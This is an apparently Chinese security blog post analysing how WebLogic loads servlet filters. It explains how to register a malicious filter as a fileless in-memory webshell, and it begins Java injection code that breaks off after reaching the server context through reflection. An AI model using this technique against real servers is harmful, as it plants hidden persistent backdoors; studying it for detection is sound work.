7.96Q19.87 7.94 19.89 7.93L19.89 7.93L19.89 7.93Q19.95 7.91 19.98 7.90L19.98 7.90L19.98 7.90Q20.02 7.90 20.04 7.83L20.04 7.83L20.04 7.83Q20.05 7.76 20.06 7.76L20.06 7.76L20.06 7.76Q20.07 7.77 20.15 7.83L20.15 7.83L20.15 7.83Q20.17 7.87 20.32 8.07L20.32 8.07L20.32 8.07Q20.47 8.27 20.69 8.58L20.69 8.58L20.69 8.58Q20.90 8.88 21.13 9.24L21.13 9.24L21.13 9.24Q21.37 9.60 21.57 9.95L21.57 9.95L21.57 9.95Q21.78 9.67 22.03 9.32L22.03 9.32L22.03 9.32Q22.29 8.98 22.53 8.66L22.53 8.66L22.53 8.66Q22.77 8.35 22.98 8.12L22.98 8.12L22.98 8.12Q23.18 7.89 23.28 7.83L23.28 7.83L23.28 7.83Q23.36 7.79 23.39 7.77L23.39 7.77L23.39 7.77Q23.43 7.76 23.45 7.76L23.45 7.76L23.45 7.76Q23.48 7.76 23.52 7.80L23.52 7.80L23.52 7.80Q23.58 7.83 23.64 7.85L23.64 7.85L23.64 7.85Q23.70 7.87 23.74 7.93L23.74 7.93L23.74 7.93Q23.80 7.99 23.80 8.06L23.80 8.06L23.80 8.06Q23.81 8.12 23.79 8.20L23.79 8.20L23.79 8.20Q23.78 8.23 23.67 8.39L23.67 8.39L23.67 8.39Q23.56 8.56 23.34 8.85L23.34 8.85L23.34 8.85Q23.12 9.15 22.77 9.57L22.77 9.57L22.77 9.57Q22.43 10.00 21.94 10.58L21.94 10.58L21.94 10.58Q22.07 10.81 22.24 11.08L22.24 11.08L22.24 11.08Q22.42 11.35 22.60 11.61L22.60 11.61L22.60 11.61Q22.78 11.87 22.95 12.12L22.95 12.12L22.95 12.12Q23.12 12.36 23.26 12.55L23.26 12.55L23.26 12.55Q23.41 12.75 23.51 12.88L23.51 12.88L23.51 12.88Q23.60 13.01 23.63 13.04ZM29.19 11.40L29.19 11.40L29.19 11.40Q29.19 11.79 29.02 12.20L29.02 12.20L29.02 12.20Q28.85 12.60 28.54 12.93L28.54 12.93L28.54 12.93Q28.23 13.26 27.78 13.47L27.78 13.47L27.78 13.47Q27.34 13.69 26.78 13.69L26.78 13.69L26.78 13.69Q26.33 13.69 25.87 13.49L25.87 13.49L25.87 13.49Q25.41 13.30 25.04 12.94L25.04 12.94L25.04 12.94Q24.67 12.58 24.44 12.07L24.44 12.07L24.44 12.07Q24.21 11.56 24.21 10.92L24.21 10.92L24.21 10.92Q24.21 10.29 24.45 9.73L24.45 9.73L24.45 9.73Q24.69 9.17 25.09 8.75L25.09 8.75L25.09 8.75Q25.48 8.33 25.99 8.08L25.99 8.08L25.99 8.08Q26.50 7.83 27.04 7.83L27.04 7.83L27.04 7.83Q27.54 7.83 27.89 7.97L27.89 7.97L27.89 7.97Q28.23 8.10 28.44 8.28L28.44 8.28L28.44 8.28Q28.66 8.46 28.75 8.65L28.75 8.65L28.75 8.65Q28.84 8.85 28.84 8.96L28.84 8.96L28.84 8.96Q28.84 9.22 28.73 9.39L28.73 9.39L28.73 9.39Q28.62 9.55 28.48 9.63L28.48 9.63L28.48 9.63Q28.34 9.71 28.22 9.72L28.22 9.72L28.22 9.72Q28.09 9.73 28.05 9.68L28.05 9.68L28.05 9.68Q28.03 9.65 28.00 9.65L28.00 9.65L28.00 9.65Q27.97 9.65 27.93 9.67L27.93 9.67L27.93 9.67Q27.90 9.68 27.87 9.69L27.87 9.69L27.87 9.69Q27.84 9.71 27.82 9.69L27.82 9.69L27.82 9.69Q27.78 9.68 27.81 9.63L27.81 9.63L27.81 9.63Q27.84 9.58 27.84 9.55L27.84 9.55L27.84 9.55Q27.84 9.49 27.84 9.41L27.84 9.41L27.84 9.41Q27.84 9.33 27.87 9.24L27.87 9.24L27.87 9.24Q27.93 9.12 27.92 8.97L27.92 8.97L27.92 8.97Q27.91 8.83 27.82 8.70L27.82 8.70L27.82 8.70Q27.73 8.57 27.53 8.48L27.53 8.48L27.53 8.48Q27.34 8.39 27.03 8.39L27.03 8.39L27.03 8.39Q26.81 8.39 26.51 8.53L26.51 8.53L26.51 8.53Q26.21 8.67 25.94 8.98L25.94 8.98L25.94 8.98Q25.67 9.28 25.48 9.75L25.48 9.75L25.48 9.75Q25.29 10.22 25.29 10.87L25.29 10.87L25.29 10.87Q25.29 11.15 25.36 11.46L25.36 11.46L25.36 11.46Q25.44 11.76 25.62 12.02L25.62 12.02L25.62 12.02Q25.81 12.28 26.12 12.45L26.12 12.45L26.12 12.45Q26.43 12.62 26.92 12.62L26.92 12.62L26.92 12.62Q27.24 12.62 27.51 12.53L27.51 12.53L27.51 12.53Q27.78 12.44 28 12.30L28 12.30L28 12.30Q28.22 12.17 28.39 12.00L28.39 12.00L28.39 12.00Q28.56 11.84 28.68 11.69L28.68 11.69L28.68 11.69Q28.79 11.55 28.86 11.44L28.86 11.44L28.86 11.44Q28.92 11.33 28.94 11.30L28.94 11.30L28.94 11.30Q28.96 11.27 29.00 11.25L29.00 11.25L29.00 11.25Q29.05 11.23 29.09 11.24L29.09 11.24L29.09 11.24Q29.13 11.25 29.16 11.29L29.16 11.29L29.16 11.29Q29.19 11.33 29.19 11.40ZM32.44 13.19L32.44 13.19L32.44 13.19Q32.85 13.19 33.25 13.27L33.25 13.27L33.25 13.27Q33.66 13.34 33.99 13.52L33.99 13.52L33.99 13.52Q34.32 13.70 34.52 13.99L34.52 13.99L34.52 13.99Q34.72 14.28 34.72 14.72L34.72 14.72L34.72 14.72Q34.72 15.04 34.57 15.37L34.57 15.37L34.57 15.37Q34.42 15.70 34.15 16.00L34.15 16.00L34.15 16.00Q33.89 16.31 33.53 16.58L33.53 16.58L33.53 16.58Q33.17 16.86 32.75 17.06L32.75 17.06L32.75 17.06Q32.33 17.26 31.88 17.38L31.88 17.38L31.88 17.38Q31.43 17.49 30.98 17.49L30.98 17.49L30.98 17.49Q30.61 17.49 30.29 17.41L30.29 17.41L30.29 17.41Q29.96 17.34 29.72 17.18L29.72 17.18L29.72 17.18Q29.48 17.02 29.33 16.79L29.33 16.79L29.33 16.79Q29.19 16.55 29.19 16.23L29.19 16.23L29.19 16.23Q29.19 15.91 29.31 15.64L29.31 15.64L29.31 15.64Q29.44 15.36 29.64 15.13L29.64 15.13L29.64 15.13Q29.84 14.90 30.10 14.71L30.10 14.71L30.10 14.71Q30.36 14.52 30.64 14.39L30.64 14.39L30.64 14.39Q30.91 14.27 31.18 14.20L31.18 14.20L31.18 14.20Q31.45 14.13 31.66 14.13L31.66 14.13L31.66 14.13Q31.78 14.14 31.82 14.16L31.82 14.16L31.82 14.16Q31.86 14.18 31.86 14.20L31.86 14.20L31.86 14.20Q31.86 14.22 31.84 14.25L31.84 14.25L31.84 14.25Q31.82 14.28 31.82 14.30L31.82 14.30L31.82 14.30Q31.83 14.34 31.85 14.40L31.85 14.40L31.85 14.40Q31.86 14.45 31.86 14.51L31.86 14.51L31.86 14.51Q31.86 14.57 31.84 14.63L31.84 14.63L31.84 14.63Q31.81 14.68 31.74 14.69L31.74 14.69L31.74 14.69Q31.45 14.76 31.11 14.92L31.11 14.92L31.11 14.92Q30.76 15.09 30.46 15.31L30.46 15.31L30.46 15.31Q30.15 15.53 29.95 15.79L29.95 15.79L29.95 15.79Q29.74 16.04 29.74 16.30L29.74 16.30L29.74 16.30Q29.74 16.43 29.85 16.48L29.85 16.48L29.85 16.48Q29.97 16.54 30.18 16.54L30.18 16.54L30.18 16.54Q30.44 16.54 30.80 16.46L30.80 16.46L30.80 16.46Q31.17 16.39 31.55 16.25L31.55 16.25L31.55 16.25Q31.94 16.11 32.32 15.90L32.32 15.90L32.32 15.90Q32.70 15.70 33.01 15.45L33.01 15.45L33.01 15.45Q33.31 15.20 33.50 14.90L33.50 14.90L33.50 14.90Q33.68 14.61 33.68 14.27L33.68 14.27L33.68 14.27Q33.68 14.11 33.62 14.02L33.62 14.02L33.62 14.02Q33.55 13.92 33.47 13.88L33.47 13.88L33.47 13.88Q33.38 13.83 33.29 13.82L33.29 13.82L33.29 13.82Q33.20 13.81 33.13 13.81L33.13 13.81L33.13 13.81Q32.65 13.81 32.14 13.87L32.14 13.87L32.14 13.87Q31.64 13.92 31.22 13.99L31.22 13.99L31.22 13.99Q30.81 14.05 30.54 14.11L30.54 14.11L30.54 14.11Q30.28 14.17 30.26 14.17L30.26 14.17L30.26 14.17Q30.11 14.17 29.99 14.11L29.99 14.11L29.99 14.11Q29.86 14.05 29.77 13.95L29.77 13.95L29.77 13.95Q29.68 13.86 29.63 13.73L29.63 13.73L29.63 13.73Q29.58 13.60 29.58 13.47L29.58 13.47L29.58 13.47Q29.58 13.37 29.70 13.18L29.70 13.18L29.70 13.18Q29.83 12.98 30.02 12.76L30.02 12.76L30.02 12.76Q30.22 12.53 30.48 12.31L30.48 12.31L30.48 12.31Q30.73 12.09 30.99 11.95L30.99 11.95L30.99 11.95Q30.76 11.83 30.58 11.65L30.58 11.65L30.58 11.65Q30.39 11.47 30.27 11.27L30.27 11.27L30.27 11.27Q30.14 11.06 30.07 10.83L30.07 10.83L30.07 10.83Q30.00 10.60 30.00 10.36L30.00 10.36L30.00 10.36Q30.00 9.90 30.13 9.54L30.13 9.54L30.13 9.54Q30.26 9.18 30.47 8.91L30.47 8.91L30.47 8.91Q30.69 8.65 30.95 8.47L30.95 8.47L30.95 8.47Q31.21 8.29 31.47 8.18L31.47 8.18L31.47 8.18Q31.73 8.07 31.96 8.03L31.96 8.03L31.96 8.03Q32.20 7.98 32.35 7.98L32.35 7.98L32.35 7.98Q32.43 7.98 32.48 7.99L32.48 7.99L32.48 7.99Q32.53 8.00 32.57 8.01L32.57 8.01L32.57 8.01Q32.74 7.74 32.97 7.43L32.97 7.43L32.97 7.43Q33.19 7.12 33.42 6.81L33.42 6.81L33.42 6.81Q33.66 6.51 33.90 6.23L33.90 6.23L33.90 6.23Q34.13 5.95 34.33 5.74L34.33 5.74L34.33 5.74Q34.52 5.52 34.66 5.40L34.66 5.40L34.66 5.40Q34.79 5.27 34.84 5.27L34.84 5.27L34.84 5.27Q34.90 5.27 34.99 5.35L34.99 5.35L34.99 5.35Q35.08 5.43 35.16 5.53L35.16 5.53L35.16 5.53Q35.25 5.63 35.30 5.72L35.30 5.72L35.30 5.72Q35.36 5.81 35.36 5.84L35.36 5.84L35.36 5.84Q35.36 5.88 35.33 5.91L35.33 5.91L35.33 5.91Q35.31 5.93 35.31 5.95L35.31 5.95L35.31 5.95Q35.31 5.99 35.35 6.01L35.35 6.01L35.35 6.01Q35.38 6.04 35.46 6.07L35.46 6.07L35.46 6.07Q35.47 6.08 35.48 6.08L35.48 6.08L35.48 6.08Q35.49 6.08 35.49 6.10L35.49 6.10L35.49 6.10Q35.49 6.13 35.40 6.19L35.40 6.19L35.40 6.19Q35.31 6.25 35.11 6.42L35.11 6.42L35.11 6.42Q34.91 6.58 34.60 6.86L34.60 6.86L34.60 6.86Q34.28 7.15 33.82 7.62L33.82 7.62L33.82 7.62Q33.71 7.72 33.60 7.88L33.60 7.88L33.60 7.88Q33.48 8.03 33.35 8.20L33.35 8.20L33.35 8.20Q33.52 8.29 33.71 8.45L33.71 8.45L33.71 8.45Q33.91 8.61 34.06 8.81L34.06 8.81L34.06 8.81Q34.21 9.02 34.31 9.29L34.31 9.29L34.31 9.29Q34.41 9.56 34.41 9.86L34.41 9.86L34.41 9.86Q34.41 10.52 34.19 10.96L34.19 10.96L34.19 10.96Q33.97 11.41 33.63 11.68L33.63 11.68L33.63 11.68Q33.28 11.95 32.85 12.07L32.85 12.07L32.85 12.07Q32.42 12.18 32.00 12.18L32.00 12.18L32.00 12.18Q31.90 12.18 31.80 12.17L31.80 12.17L31.80 12.17Q31.71 12.17 31.62 12.15L31.62 12.15L31.62 12.15Q31.47 12.26 31.27 12.41L31.27 12.41L31.27 12.41Q31.07 12.56 30.88 12.74L30.88 12.74L30.88 12.74Q30.69 12.91 30.53 13.10L30.53 13.10L30.53 13.10Q30.37 13.28 30.28 13.45L30.28 13.45L30.28 13.45Q30.56 13.44 30.81 13.40L30.81 13.40L30.81 13.40Q31.06 13.36 31.32 13.32L31.32 13.32L31.32 13.32Q31.58 13.27 31.85 13.23L31.85 13.23L31.85 13.23Q32.12 13.19 32.44 13.19ZM32.22 8.83L32.22 8.83L32.22 8.83Q32.22 8.69 32.38 8.36L32.38 8.36L32.38 8.36Q32.06 8.46 31.81 8.67L31.81 8.67L31.81 8.67Q31.55 8.87 31.38 9.13L31.38 9.13L31.38 9.13Q31.20 9.39 31.10 9.69L31.10 9.69L31.10 9.69Q31.01 9.99 31.01 10.28L31.01 10.28L31.01 10.28Q31.01 10.49 31.06 10.69L31.06 10.69L31.06 10.69Q31.11 10.88 31.22 11.04L31.22 11.04L31.22 11.04Q31.33 11.19 31.50 11.28L31.50 11.28L31.50 11.28Q31.68 11.38 31.93 11.38L31.93 11.38L31.93 11.38Q32.20 11.38 32.42 11.28L32.42 11.28L32.42 11.28Q32.63 11.18 32.80 11.02L32.80 11.02L32.80 11.02Q32.96 10.86 33.08 10.66L33.08 10.66L33.08 10.66Q33.19 10.46 33.26 10.26L33.26 10.26L33.26 10.26Q33.33 10.07 33.37 9.90L33.37 9.90L33.37 9.90Q33.40 9.73 33.40 9.63L33.40 9.63L33.40 9.63Q33.40 9.21 33.27 8.99L33.27 8.99L33.27 8.99Q33.13 8.76 32.96 8.64L32.96 8.64L32.96 8.64Q32.86 8.76 32.76 8.86L32.76 8.86L32.76 8.86Q32.66 8.97 32.55 9.08L32.55 9.08L32.55 9.08Q32.53 9.09 32.50 9.09L32.50 9.09L32.50 9.09Q32.48 9.09 32.47 9.07L32.47 9.07L32.47 9.07Q32.46 9.05 32.42 9.05L32.42 9.05L32.42 9.05Q32.40 9.05 32.38 9.07L32.38 9.07L32.38 9.07Q32.36 9.09 32.33 9.09L32.33 9.09L32.33 9.09Q32.28 9.09 32.25 9.04L32.25 9.04L32.25 9.04Q32.22 8.98 32.22 8.83Z"></path></g><!----><!----></svg></a>
        
    </div>

                    <nav class="nav">
    <ul class="menu" id="menu">
        
            
        
        
        
        
            
                <li class="menu-item"><a href="/archives/"><span class="menu-item-name">文章</span></a>
                </li>
            
        
            
                <li class="menu-item"><a href="/tags/"><span class="menu-item-name">标签</span></a>
                </li>
            
        
            
                <li class="menu-item"><a href="/about/"><span class="menu-item-name">关于</span></a>
                </li>
            
        
            
                
                    
                    
                
            
        
            
                
            
        
    </ul>
</nav>

                    
                </div>
            </div>
            
    <input type="checkbox" id="nav-toggle" aria-hidden="true" />
    <label for="nav-toggle" class="nav-toggle"></label>
    <label for="nav-toggle" class="nav-curtain"></label>


        
    </header>




            
            
    <main class="main single" id="main">
    <div class="main-inner">

        

        <article class="content post h-entry" data-align="justify" data-type="posts" data-toc-num="true">

            <h1 class="post-title p-name">Weblogic 内存马分析与实现</h1>

            

            
                
            

            
                

<div class="post-meta">
    
        
        <time datetime="2021-11-06T22:02:36&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2021.11.6</time>
    
    
    
    
        
        
        
            
        
    
    
    
        
        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;10&nbsp;分钟</span>
    

   
    

    
    
</div>

            

            <nav class="contents">
  <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
    <li><a id="contents:filter" href="#filter">Filter</a>
      <ol>
        <li><a id="contents:filter-加载过程分析" href="#filter-加载过程分析">Filter 加载过程分析</a></li>
        <li><a id="contents:实现代码" href="#实现代码">实现代码</a></li>
      </ol>
    </li>
    <li><a id="contents:listener" href="#listener">Listener</a>
      <ol>
        <li><a id="contents:listener-注册过程分析" href="#listener-注册过程分析">Listener 注册过程分析</a></li>
        <li><a id="contents:实现代码-1" href="#实现代码-1">实现代码</a></li>
      </ol>
    </li>
    <li><a id="contents:servlet" href="#servlet">Servlet</a></li>
    <li><a id="contents:获取webappservletcontext" href="#获取webappservletcontext">获取WebAppServletContext</a>
      <ol>
        <li><a id="contents:获取所有-context" href="#获取所有-context">获取所有 Context</a></li>
        <li><a id="contents:从当前线程中获取-context" href="#从当前线程中获取-context">从当前线程中获取 Context</a></li>
        <li><a id="contents:从request获取-context" href="#从request获取-context">从Request获取 Context</a></li>
        <li><a id="contents:获取随机路径" href="#获取随机路径">获取随机路径</a></li>
      </ol>
    </li>
    <li><a id="contents:内存马查杀" href="#内存马查杀">内存马查杀</a></li>
    <li><a id="contents:测试注意事项" href="#测试注意事项">测试注意事项</a></li>
    <li><a id="contents:参考" href="#参考">参考</a></li>
  </ol>
</nav><div class="post-body e-content">
                <h2 id="filter"><a href="#filter" class="anchor-link">#</a><a href="#contents:filter" class="headings">Filter</a></h2>
<h3 id="filter-加载过程分析"><a href="#filter-加载过程分析" class="anchor-link">#</a><a href="#contents:filter-加载过程分析" class="headings">Filter 加载过程分析</a></h3>
<p>Weblogic Filter内存马和Tomcat其实差不多。</p>
<p>在<code>weblogic.servlet.internal.WebAppServletContext#wrapRun</code>中通过getFilterChain()获取包含Filter链的FilterChainImpl对象。
<img src="/images/image-20211106220512.png" alt="">
跟进<code>getFilterChain()</code>方法，该方法在<code>weblogic.servlet.internal.FilterManager</code>类中，可以看到该方法实例化了一个FilterChainImpl类，并添加包含Filter的wrapper到该对象中。
<img src="/images/image-20211106220554.png" alt="">
返回FilterChainImpl对象
<img src="/images/image-20211106220618.png" alt="">
获取了FilterChainImpl对象后，再调用该对象的doFilter()方法，跟进doFilter()方法。可以看到这步就获取注册的Filter类，并调用Filter的doFilter方法。
<img src="/images/image-20211106220644.png" alt="">
<img src="/images/image-20211106220657.png" alt="">
<strong>手动注册Filter类</strong></p>
<p>在<code>weblogic.servlet.internal.FilterManager</code>类中有一个registerFilter方法可以动态注册Filter。
<img src="/images/image-20211106220720.png" alt="">
该方法中，创建FilterWrapper对象传入FilterClassName字符串后，在<code>this.loadFilter(fw)</code>中对该filter类进行加载。
<img src="/images/image-20211106220741.png" alt="">
loadFilter中调用<code>this.context.createInstance(filterClassName)</code>对类进行加载，跟进查看。
<img src="/images/image-20211106220802.png" alt="">
使用的是weblogic自己定义的一个classloader，调用自定义的loadclass方法。<code>ChangeAwareClassLoader.loadClass</code>方法会从cache中查找是否存在待查找的类，也就是this.cachedClasses这个变量。
<img src="/images/image-20211106220822.png" alt="">
总结: 如果要手动注册Filter，只需要将恶意filter添加到cachedClasses中，然后调用registerFilter接口进行添加即可。</p>
<h3 id="实现代码"><a href="#实现代码" class="anchor-link">#</a><a href="#contents:实现代码" class="headings">实现代码</a></h3>
<p><strong><em>Tips:</em></strong> 代码解释看注释</p>
<p>测试weblogic 1036和12.1.3成功</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">com.example.web</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sun.misc.BASE64Decoder</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">weblogic.servlet.internal.ServletRequestImpl</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">weblogic.servlet.internal.WebAppServletContext</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.*</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="n">String</span> <span class="n">message</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">message</span> <span class="o">=</span> <span class="s">&#34;Hello World!&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Thread</span> <span class="n">thread</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//获取WebAppServletContext
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Field</span> <span class="n">workEntry</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;weblogic.work.ExecuteThread&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;workEntry&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">workEntry</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Object</span> <span class="n">workentry</span> <span class="o">=</span> <span class="n">workEntry</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">thread</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">WebAppServletContext</span> <span class="n">webAppServletContext</span><span class="o">=</span><span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="o">{</span> <span class="c1">//weblogic 12.1.3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">Field</span> <span class="n">connectionHandler</span> <span class="o">=</span> <span class="n">workentry</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;connectionHandler&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">connectionHandler</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">Object</span> <span class="n">http</span> <span class="o">=</span> <span class="n">connectionHandler</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">workentry</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">Field</span> <span class="n">request1</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;request&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">request1</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">ServletRequestImpl</span> <span class="n">servletRequest</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServletRequestImpl</span><span class="o">)</span> <span class="n">request1</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">http</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">Field</span> <span class="n">context</span> <span class="o">=</span> <span class="n">servletRequest</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">webAppServletContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">                <span class="c1">//weblogic 1036
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">Field</span> <span class="n">context</span> <span class="o">=</span> <span class="n">workentry</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">webAppServletContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">workentry</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
